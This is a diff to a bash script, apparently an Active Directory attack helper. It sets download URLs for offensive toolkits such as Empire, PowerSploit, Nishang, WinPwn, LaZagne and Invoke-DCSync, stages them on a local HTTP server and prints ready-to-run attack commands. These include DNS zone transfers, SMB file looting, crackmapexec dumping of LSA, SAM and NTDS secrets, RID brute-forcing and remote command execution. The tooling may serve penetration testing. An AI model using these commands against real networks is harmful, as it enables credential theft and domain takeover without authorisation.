@@ -23,17 +23,17 @@ baseLDAP="";			#
 DC="";				#
 NS="IP";			#
 
+BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
 EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
+GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
+JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
+LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
 PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
-LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
-S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
-GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
-SecListsRepo="https://github.com/danielmiessler/SecLists/";
-JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
-BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
 PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
+S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
+SecListsRepo="https://github.com/danielmiessler/SecLists/";
 
 LocalRepo="False"
 
@@ -95,14 +95,14 @@ mkdir -p $HOME/ADAT/LocalRepo
 cd $HOME/ADAT
 
 
+BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
 EmpireLocalRepo="$HOME/ADAT/Empire"
+GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
+JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
 PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
-WinPwnLocalRepo="$HOME/ADAT/WinPwn"
-JAWSLocalRepo="$HOME/ADAT/JAWS"
-GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
-BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
 PowersploitLocalRepo="$HOME/ADAT/Powersploit"
+WinPwnLocalRepo="$HOME/ADAT/WinPwn"
 
 
 if [ -d "$EmpireLocalRepo" ] 
@@ -220,14 +220,14 @@ else
 	echo -e ""
 fi
 
-cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
-cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/Powersploit/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
@@ -415,9 +415,9 @@ echo -e "dig AXFR $Domain @$NQIP"
 echo -e "dig @$NQIP $Domain"
 echo -e "dig @$NQIP $Domain A"
 echo -e "dig @$NQIP $Domain AAAA"
-echo -e "dig @$NQIP $Domain PTR"
-echo -e "dig @$NQIP $Domain NS"
 echo -e "dig @$NQIP $Domain MX"
+echo -e "dig @$NQIP $Domain NS"
+echo -e "dig @$NQIP $Domain PTR"
 echo -e ""
 echo -e "${IBLUE}Fierce${RESTORE}"
 echo -e "fierce -dns $Domain"
@@ -474,25 +474,23 @@ echo -e ""
 echo -e "${IBLUE}SMBmap${RESTORE}"
 echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain"
 echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain -R"
-echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain -A .zip"
+echo -n -e "smbmap -H $IP -u $Username -p $Password -d $Domain -R -A .zip";echo -e " ${YELLOW}  # Pattern match, download files${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}SMBclient${RESTORE}"
 echo -e "smbclient -U $Username -P $Password -L \\\\\\\\\\\\\\\\$NQIP -W $Domain"
 echo -e ""
 echo -e "${IBLUE}Crackmapexec${RESTORE}"
-echo -e "crackmapexec smb $IP -u $Username -p $Password"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --rid-brute"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --disks"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --groups"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --local-groups"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --lsa"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sam"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --pass-pol"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --local-groups"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --groups"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --users"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --rid-brute"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sam"
 echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sessions"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --disks"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users"
-echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --users"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
 echo -e ""
